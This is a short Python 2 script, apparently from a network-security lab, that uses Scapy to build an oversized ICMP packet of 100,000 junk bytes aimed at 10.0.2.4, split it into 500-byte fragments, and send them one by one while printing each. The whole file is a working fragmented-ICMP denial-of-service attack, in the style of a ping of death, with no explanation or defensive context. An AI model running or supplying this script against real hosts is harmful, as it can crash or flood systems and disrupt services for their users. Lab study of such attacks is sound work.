from scapy.all import *
dip="10.0.2.4"


ip_hdr = IP(dst=dip)
packet = ip_hdr/ICMP()/("m"*100000) #send 60k bytes of junk

frags=fragment(packet,fragsize=500)

counter=1
for fragment in frags:
  print "Packet no#"+str(counter)
  print "==================================================="
  fragment.show() 
  counter+=1
  send(fragment)
